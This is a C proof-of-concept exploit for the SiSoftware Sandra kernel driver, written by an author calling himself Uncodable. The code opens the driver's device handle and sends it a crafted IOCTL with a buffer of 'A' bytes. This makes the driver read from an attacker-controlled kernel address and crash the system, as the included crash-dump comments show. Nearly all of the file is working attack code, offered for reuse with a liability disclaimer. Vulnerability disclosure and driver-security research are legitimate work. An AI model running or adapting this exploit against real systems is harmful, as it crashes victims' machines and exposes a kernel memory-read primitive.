#include <Windows.h>
#include <stdio.h>

// The buffer size doesn't really matter, but this proof of concept will be using a buffer size of 4096 bytes. You may want to increase the buffer size
// in case you want to pass more data into the buffer. The handling of the data in the buffer passed to the device driver is explained in line 15.
int buffer[4096] = { 0 };

/*
	Exploits SiSoftware Sandra, a system information and diagnostic utility. The PoC is written by Uncodable. 
	Credit me if you use this knowledge. For legal purposes, I am not responsible for what you do with this code.
*/
int main(int argc, char* argv[])
{
	// Set the buffer's contents to 'A', for the sake of this proof of concept. 
	// You can control the address from where the device driver reads data from using this buffer.
	// The buffer contents provided will make the device driver read from this address: fffffaa0a0a0a0a0
	// Sample crash dump with limited details:
	// PAGE_FAULT_IN_NONPAGED_AREA (50)
	// Invalid system memory was referenced.This cannot be protected by try - except.
	// Typically the address is just plain bad or it is pointing at freed memory.
	// Arguments:
	// Arg1: fffffaa0a0a0a0a0, memory referenced.
	// Arg2: 0000000000000000, value 0 = read operation, 1 = write operation.
	// Arg3: fffff8028fe9c21c, If non - zero, the instruction address which referenced the bad memory
	// address.
	// Arg4: 0000000000000002, (reserved)
	memset(buffer, 'A', sizeof(buffer));

	printf("Proof-of-Concept by Uncodable (3/14/2021). Exploiting SiSoftware Sandra in five seconds...");

	// Wait five seconds in case the user ran it accidentally. Also so they can actually read the text printed to the console.
	Sleep(5000);

	// Obtain a handle to the device driver.
	HANDLE hDriver = CreateFileA("\\\\.\\SANDRA", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

	// Add a catch for whether a handle was obtained or not.
	if (hDriver == -1) 
	{
		printf("\n[-] Failed to obtain a handle to the Sandra device driver.");
		getchar();
		return 0;
	}

	printf("\n[*] Sending buffer filled with 'A' to the Sandra device driver...");

	// Send a device IO control to the device driver to exploit the vulnerability.
	DeviceIoControl(hDriver, 2270344, buffer, sizeof(buffer), NULL, 0, NULL, NULL);

	// The exploit is finished.
	printf("\n[+] Proof-of-concept finished.");

	return 1;
}